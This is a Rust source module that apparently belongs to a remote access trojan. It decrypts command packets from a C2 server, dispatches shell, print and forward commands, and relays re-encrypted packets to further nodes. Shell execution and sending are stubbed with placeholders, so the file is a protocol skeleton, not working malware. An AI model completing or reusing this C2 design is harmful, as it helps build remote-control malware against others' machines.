use crate::{crypto::ser_encrypt, Packet, Command, Error};

extern crate sodiumoxide;
use sodiumoxide::crypto::box_ as crypto;

extern crate bincode;

pub fn commands<FSend>(
    cmds: Vec<Command>,
    rat_skey: &crypto::SecretKey,
    full_bytes: &[u8],
    mut send_message: FSend,
) -> crate::Result<()>
where
    FSend: FnMut(String, &[u8]) -> Result<(), String>,
{
    let mut addons = vec![];
    let mut nexts = vec![];
    for cmd in cmds.into_iter() {
        println!("Got command: {:?}", cmd);
        match cmd {
            Command::Shell(line, recver_pkey) => {
                let res = format!("<output of `{}`>", line).into_bytes();
                addons.push((recver_pkey, Command::ShellOutput(res)));
            }
            Command::ShellOutput(out) => {
                println!("Output: {}", std::str::from_utf8(&out).unwrap());
            }

            Command::Forward(to) => nexts.push(to),

            Command::Print(what) => println!("{}", what),
        }
    }
    if !nexts.is_empty() {
        let (headers, mut bodies): (Vec<Vec<u8>>, Vec<Vec<u8>>) =
            bincode::deserialize(full_bytes).map_err(Error::BincodeFail)?;
        for (recver_pkey, new_cmd) in addons.into_iter() {
            let encd = ser_encrypt(&new_cmd, rat_skey, &recver_pkey)?;
            bodies.push(encd);
        }
        let new_packet =
            bincode::serialize(&(headers, bodies)).map_err(Error::BincodeFail)?;
        for next in nexts {
            send_message(next, &new_packet).map_err(Error::SendFailed)?;
        }
    }
    Ok(())
}

pub fn packet<FSend>(
    c2_pkey: &crypto::PublicKey,
    rat_skey: &crypto::SecretKey,
    bytes: &[u8],
    send_message: FSend,
) -> crate::Result<()>
where
    FSend: FnMut(String, &[u8]) -> Result<(), String>,
{
    let unpacked = Packet::deserialize(bytes, c2_pkey, rat_skey)?;
    commands(unpacked, rat_skey, bytes, send_message)
}

pub fn send(dest: String, data: &[u8]) -> Result<(), String> {
    use std::io::Write as _;
    println!("Send {}-byte payload to {}", data.len(), dest);
    match std::io::stderr().write_all(&data) {
        Ok(_) => Ok(()),
        Err(e) => Err(format!("{:?}", e)),
    }
}
